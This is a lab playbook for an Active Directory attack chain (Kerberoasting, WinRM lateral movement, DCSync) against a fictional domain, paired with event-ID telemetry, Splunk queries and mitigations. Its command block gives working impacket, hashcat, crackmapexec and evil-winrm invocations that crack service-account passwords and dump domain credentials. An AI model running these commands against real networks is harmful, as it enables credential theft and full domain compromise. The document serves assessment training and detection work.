# 01) Kerberoasting → Lateral Movement → DCSync
**ATT&CK:** T1558.003 (Kerberoasting), T1021 (Remote Services), T1003.006 (DCSync)  
**Scope:** Authorized lab/assessment only.

## Objective
Obtain a service account credential via Kerberos TGS request/analysis, use it for lateral movement, and (if misconfig permits) perform directory replication (DCSync).

## Environment (assumed)
- **Domain:** `DRAGONBALL.local`
- **DC:** `DC01` — **10.8.10.225**
- **Service host:** `SVC01` — **10.8.10.15**
- **Operator box:** `KALI` — **10.8.10.50**

## Procedure (High-Level)
1. Enumerate SPN-bearing accounts; request TGS as a standard domain user.  
2. Analyze TGS offline to recover weak service account credentials.  
3. Validate access; laterally move (e.g., WinRM/SMB) to `SVC01`.  
4. If group/ACL misconfig allows, attempt directory replication (DCSync) from `DC01`.

> **Legal/Ethical:** Commands below are documentation examples for **authorized** labs only.

## Doc-Only Command Examples (authorized lab)
```bash
# Enumerate SPNs + request TGS (example creds)
GetUserSPNs.py DRAGONBALL.local/john.doe:'Winter2025!' -dc-ip 10.8.10.225 -request | tee spns.out

# Offline key analysis (RC4/AES as applicable)
hashcat -m 13100 spns.out /wordlists/rockyou.txt

# Validate creds / lateral movement to SVC01 (WinRM)
crackmapexec winrm 10.8.10.15 -d DRAGONBALL.local -u svc-backup -p '<cracked>'
evil-winrm -i 10.8.10.15 -u svc-backup -p '<cracked>'

# Directory replication (if account/ACL permits)
secretsdump.py 'DRAGONBALL.local/svc-backup:<cracked>@10.8.10.225' -just-dc
```
## Telemetry to Collect
- Kerberos: 4768/4769/4771 (TGT/TGS/pre-auth anomalies)
- Logons: 4624 (Type 3/10) from new sources; 4625 bursts
- Service install: 7045 (PsExec-like behavior)
- Directory changes: 5136/5137 (group/ACL/GPO edits)
- Replication access: 4662 (Get-Changes / Get-Changes-All)
---
# SIEM Analytics (Splunk examples)
index=wineventlog (EventCode=4769)
| stats count by ServiceName, IpAddress
| where count>100
index=wineventlog EventCode=4662
| search AccessMask="*0x100*" OR AccessMask="*0x200*"
---

## Mitigations

- **Service accounts:** use **25+ char** random passwords; enforce **AES-only** (disable RC4).
- **SPN hygiene:** remove SPNs from **highly privileged** users.
- **Lateral controls:** limit **WinRM** to **jump hosts**; use **Windows LAPS** for local admins; follow a **tiered admin model (T0/T1/T2)**.
- **Monitoring:** alert on **5136/5137** for Tier-0 objects; monitor **4662** (replication activity).
- **Post-incident:** perform **KRBTGT double rotation**.
